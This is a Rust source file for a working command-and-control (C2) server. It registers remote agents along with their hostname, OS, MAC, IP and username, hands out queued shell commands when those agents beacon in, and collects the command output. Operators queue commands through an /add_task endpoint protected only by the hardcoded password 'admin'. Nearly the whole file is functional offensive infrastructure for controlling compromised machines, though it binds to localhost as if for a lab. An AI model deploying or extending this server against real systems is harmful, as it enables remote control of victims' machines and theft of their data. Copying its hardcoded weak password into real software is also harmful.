use bytes::Bytes;
use chrono::{DateTime, Utc};
use http_body_util::{BodyExt, Full};
use hyper::server::conn::http1;
use hyper::service::service_fn;
use hyper::{Method, Request, Response, StatusCode};
use hyper_util::rt::TokioIo;
use protocol::*;
use std::collections::{HashMap, VecDeque};
use std::convert::Infallible;
use std::net::SocketAddr;
use std::sync::{Arc, Mutex};
use tokio::net::TcpListener;
use uuid::Uuid;

#[derive(Debug, Clone, serde::Serialize)]
struct Agent {
    id: Uuid,
    hostname: String,
    os: String,
    os_version: String,
    mac: String,
    ip: String,
    username: String,
    registered_at: DateTime<Utc>,
    last_seen: DateTime<Utc>,
}

#[derive(Debug, Clone)]
struct TaskInfo {
    id: Uuid,
    agent_id: Uuid,
    command: String,
    created_at: DateTime<Utc>,
    result: Option<TaskResult>,
}

#[derive(Debug, Clone)]
struct TaskResult {
    output: String,
    exit_code: i32,
    completed_at: DateTime<Utc>,
}

struct State {
    agents: HashMap<Uuid, Agent>,
    tasks: HashMap<Uuid, TaskInfo>,
    task_queues: HashMap<Uuid, VecDeque<Uuid>>,
}

impl State {
    fn new() -> Self {
        State {
            agents: HashMap::new(),
            tasks: HashMap::new(),
            task_queues: HashMap::new(),
        }
    }

    fn add_agent(&mut self, req: RegisterRequest) -> Uuid {
        let agent_id = Uuid::new_v4();
        let now = Utc::now();
        let agent = Agent {
            id: agent_id,
            hostname: req.hostname,
            os: req.os,
            os_version: req.os_version,
            mac: req.mac,
            ip: req.ip,
            username: req.username,
            registered_at: now,
            last_seen: now,
        };
        self.agents.insert(agent_id, agent);
        println!("[+] New agent registered: {}", agent_id);
        agent_id
    }

    fn update_last_seen(&mut self, agent_id: Uuid) {
        if let Some(agent) = self.agents.get_mut(&agent_id) {
            agent.last_seen = Utc::now();
        }
    }

    fn get_next_task(&mut self, agent_id: Uuid) -> Option<Task> {
        let task_id = self.task_queues.get_mut(&agent_id)?.pop_front()?;
        let task_info = self.tasks.get(&task_id)?;
        Some(Task {
            task_id: task_info.id,
            command: task_info.command.clone(),
        })
    }

    fn add_task(&mut self, agent_id: Uuid, command: String) -> Uuid {
        let task_id = Uuid::new_v4();
        let task_info = TaskInfo {
            id: task_id,
            agent_id,
            command,
            created_at: Utc::now(),
            result: None,
        };
        self.tasks.insert(task_id, task_info);
        self.task_queues
            .entry(agent_id)
            .or_insert_with(VecDeque::new)
            .push_back(task_id);
        println!("[+] Task {} queued for agent {}", task_id, agent_id);
        task_id
    }

    fn save_task_result(&mut self, task_id: Uuid, output: String, exit_code: i32) -> bool {
        if let Some(task) = self.tasks.get_mut(&task_id) {
            task.result = Some(TaskResult {
                output,
                exit_code,
                completed_at: Utc::now(),
            });
            println!("[+] Task {} completed with exit code {}", task_id, exit_code);
            true
        } else {
            false
        }
    }

    fn list_agents(&self) -> Vec<Agent> {
        self.agents.values().cloned().collect()
    }

    fn agent_exists(&self, agent_id: Uuid) -> bool {
        self.agents.contains_key(&agent_id)
    }

    fn get_task(&self, task_id: Uuid) -> Option<protocol::TaskInfo> {
        let task = self.tasks.get(&task_id)?;
        Some(protocol::TaskInfo {
            task_id: task.id,
            agent_id: task.agent_id,
            command: task.command.clone(),
            created_at: task.created_at.to_rfc3339(),
            result: task.result.as_ref().map(|r| protocol::TaskResultInfo {
                output: r.output.clone(),
                exit_code: r.exit_code,
                completed_at: r.completed_at.to_rfc3339(),
            }),
        })
    }

    fn list_tasks_for_agent(&self, agent_id: Uuid) -> Vec<protocol::TaskInfo> {
        self.tasks
            .values()
            .filter(|t| t.agent_id == agent_id)
            .map(|task| protocol::TaskInfo {
                task_id: task.id,
                agent_id: task.agent_id,
                command: task.command.clone(),
                created_at: task.created_at.to_rfc3339(),
                result: task.result.as_ref().map(|r| protocol::TaskResultInfo {
                    output: r.output.clone(),
                    exit_code: r.exit_code,
                    completed_at: r.completed_at.to_rfc3339(),
                }),
            })
            .collect()
    }
}

fn json_response<T: serde::Serialize>(data: T, status: StatusCode) -> Response<Full<Bytes>> {
    let json = serde_json::to_string(&data).unwrap();
    Response::builder()
        .status(status)
        .header("Content-Type", "application/json")
        .body(Full::new(Bytes::from(json)))
        .unwrap()
}

fn error_response(error: &str, status: StatusCode) -> Response<Full<Bytes>> {
    json_response(ErrorResponse { error: error.to_string() }, status)
}

async fn handle_request(
    req: Request<hyper::body::Incoming>,
    state: Arc<Mutex<State>>,
) -> Result<Response<Full<Bytes>>, Infallible> {
    let method = req.method().clone();
    let path = req.uri().path().to_string();
    
    println!("[*] {} {}", method, path);

    let body_bytes = match req.collect().await {
        Ok(collected) => collected.to_bytes(),
        Err(_) => return Ok(error_response("Failed to read body", StatusCode::BAD_REQUEST)),
    };

    let response = match (method, path.as_str()) {
        (Method::POST, "/register") => {
            let request: RegisterRequest = match serde_json::from_slice(&body_bytes) {
                Ok(data) => data,
                Err(_) => return Ok(error_response("Invalid JSON", StatusCode::BAD_REQUEST)),
            };
            
            let agent_id = state.lock().unwrap().add_agent(request);
            json_response(RegisterResponse { agent_id }, StatusCode::OK)
        }
        
        (Method::POST, "/beacon") => {
            let request: BeaconRequest = match serde_json::from_slice(&body_bytes) {
                Ok(data) => data,
                Err(_) => return Ok(error_response("Invalid JSON", StatusCode::BAD_REQUEST)),
            };

            let mut state = state.lock().unwrap();
            if !state.agent_exists(request.agent_id) {
                return Ok(error_response("Unknown agent", StatusCode::NOT_FOUND));
            }

            state.update_last_seen(request.agent_id);
            let task = state.get_next_task(request.agent_id);
            
            if task.is_some() {
                println!("[*] Sending task to agent {}", request.agent_id);
            }
            
            json_response(BeaconResponse { task }, StatusCode::OK)
        }

        (Method::POST, "/task_result") => {
            let request: TaskResultRequest = match serde_json::from_slice(&body_bytes) {
                Ok(data) => data,
                Err(_) => return Ok(error_response("Invalid JSON", StatusCode::BAD_REQUEST)),
            };

            let mut state = state.lock().unwrap();
            let success = state.save_task_result(request.task_id, request.output, request.exit_code);
            
            if !success {
                return Ok(error_response("Unknown task", StatusCode::NOT_FOUND));
            }
            
            json_response(TaskResultResponse { success: true }, StatusCode::OK)
        }

        (Method::POST, "/add_task") => {
            let request: AddTaskRequest = match serde_json::from_slice(&body_bytes) {
                Ok(data) => data,
                Err(_) => return Ok(error_response("Invalid JSON", StatusCode::BAD_REQUEST)),
            };

            if request.password != "admin" {
                return Ok(error_response("Unauthorized", StatusCode::UNAUTHORIZED));
            }

            let mut state = state.lock().unwrap();
            if !state.agent_exists(request.agent_id) {
                return Ok(error_response("Unknown agent", StatusCode::NOT_FOUND));
            }

            let task_id = state.add_task(request.agent_id, request.command);
            json_response(
                AddTaskResponse {
                    task_id,
                    message: format!("Task queued for agent {}", request.agent_id),
                },
                StatusCode::OK,
            )
        }

        (Method::GET, "/agents") => {
            let state = state.lock().unwrap();
            let agents = state.list_agents();
            json_response(agents, StatusCode::OK)
        }

        (Method::GET, path) if path.starts_with("/tasks/") => {
            let task_id_str = path.trim_start_matches("/tasks/");
            let task_id = match Uuid::parse_str(task_id_str) {
                Ok(id) => id,
                Err(_) => return Ok(error_response("Invalid task ID", StatusCode::BAD_REQUEST)),
            };

            let state = state.lock().unwrap();
            match state.get_task(task_id) {
                Some(task_info) => json_response(task_info, StatusCode::OK),
                None => error_response("Task not found", StatusCode::NOT_FOUND),
            }
        }

        (Method::GET, path) if path.starts_with("/agent/") && path.contains("/tasks") => {
            let parts: Vec<&str> = path.split('/').collect();
            if parts.len() < 4 {
                return Ok(error_response("Invalid path", StatusCode::BAD_REQUEST));
            }
            
            let agent_id = match Uuid::parse_str(parts[2]) {
                Ok(id) => id,
                Err(_) => return Ok(error_response("Invalid agent ID", StatusCode::BAD_REQUEST)),
            };

            let state = state.lock().unwrap();
            let tasks = state.list_tasks_for_agent(agent_id);
            json_response(tasks, StatusCode::OK)
        }

        _ => error_response("Not Found", StatusCode::NOT_FOUND),
    };

    Ok(response)
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let addr = SocketAddr::from(([127, 0, 0, 1], 8080));
    let listener = TcpListener::bind(addr).await?;
    println!("[*] C2 Server listening on http://{}", addr);
    println!("[*] Endpoints:");
    println!("    POST   /register                  - Register new agent");
    println!("    POST   /beacon                    - Agent check-in");
    println!("    POST   /task_result               - Submit task results");
    println!("    POST   /add_task                  - Queue task for agent (password: admin)");
    println!("    GET    /agents                    - List all agents");
    println!("    GET    /tasks/<task_id>           - Get task details and result");
    println!("    GET    /agent/<agent_id>/tasks    - List all tasks for agent");
    
    let state = Arc::new(Mutex::new(State::new()));

    loop {
        let state = Arc::clone(&state);
        let (stream, _) = listener.accept().await?;
        let io = TokioIo::new(stream);

        let svc = service_fn(move |req| {
            let state = Arc::clone(&state);
            handle_request(req, state)
        });

        tokio::task::spawn(async move {
            if let Err(err) = http1::Builder::new().serve_connection(io, svc).await {
                eprintln!("[-] Error serving connection: {:?}", err);
            }
        });
    }
}
